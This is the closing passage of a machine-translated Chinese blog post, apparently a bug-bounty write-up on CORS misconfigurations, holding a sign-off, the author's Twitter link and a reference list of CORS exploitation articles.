jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最后，永远记住，<strong class="jp ir">有时候你只需要跳出</strong><strong class="jp ir"/>̶b̶o̶x̶<strong class="jp ir">的范围去思考。</strong></p><p id="4037" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">感谢阅读。欢迎在推特上关注我<a class="ae lb" href="https://twitter.com/sandh0t" rel="noopener ugc nofollow" target="_blank">https://twitter.com/sandh0t</a></p><p id="c249" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">狩猎愉快。</p></div><div class="ab cl lh li hu lj" role="separator"><span class="lk bw bk ll lm ln"/><span class="lk bw bk ll lm ln"/><span class="lk bw bk ll lm"/></div><div class="ij ik il im in"><h1 id="d8b7" class="lo lp iq bd lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml bi translated">参考资料:</h1><ul class=""><li id="add0" class="ks kt iq jp b jq my ju mz jy oj kc ok kg ol kk kx ky kz la bi translated"><a class="ae lb" href="http://blog.portswigger.net/2016/10/exploiting-cors-misconfigurations-for.html" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir"> Portswigger的帖子</strong> </a></li><li id="4c49" class="ks kt iq jp b jq lc ju ld jy le kc lf kg lg kk kx ky kz la bi translated"><a class="ae lb" href="https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir">极客男孩的Pos </strong> </a> <strong class="jp ir"> t </strong></li><li id="9268" class="ks kt iq jp b jq lc ju ld jy le kc lf kg lg kk kx ky kz la bi translated"><a class="ae lb" href="https://www.corben.io/advanced-cors-techniques/" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir">科本列夫的研究</strong> </a></li><li id="e7a6" class="ks kt iq jp b jq lc ju ld jy le kc lf kg lg kk kx ky kz la bi translated"><a class="ae lb" href="https://www.bedefended.com/papers/cors-security-guide" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir">大卫·达内隆的研究</strong> </a></li></ul></div></div>    
</body>
</html>